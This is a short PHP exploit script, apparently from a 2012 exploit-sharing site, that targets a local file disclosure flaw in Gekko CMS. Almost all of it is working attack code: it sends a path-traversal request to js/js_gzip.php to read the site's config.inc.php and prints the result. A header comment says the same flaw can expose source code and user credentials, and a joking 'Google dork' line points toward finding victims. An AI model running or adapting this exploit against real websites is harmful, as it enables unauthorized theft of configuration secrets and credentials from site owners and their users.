<?php
# Author : L3b-r1'z
# Title : Gekko Cms File Disclosure
# GOOGLE DORK : Us Ur Mind ^^
# Date : 5/25/2012
# Site's : Sec4Ever.Com & Exploit4Arab.Com
#--- Info (Start) ---#
# vulnerability description:
# An attacker might read local files with this vulnerability.
# User tainted data is used when creating the file name that will be opened and
# read thus allowing an attacker to read source code and other arbitrary files 
# on the webserver that might lead to new
# attack vectors. In example the attacker can detect new vulnerabilities in
# source code files or read user credentials.
#--- Info (End) ---#
$target = $argv[1];
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_URL, "http://
$target/js/js_gzip.php?js=..%2Fconfig.inc.php");
curl_setopt($ch, CURLOPT_HTTPGET, 1);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01;
Windows NT 5.0)");
curl_setopt($ch, CURLOPT_TIMEOUT, 3);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 3);
curl_setopt($ch, CURLOPT_LOW_SPEED_TIME, 3);
curl_setopt($ch, CURLOPT_COOKIEJAR, "/tmp/cookie_$target");
$buf = curl_exec ($ch);
curl_close($ch);
unset($ch);
echo $buf;
?>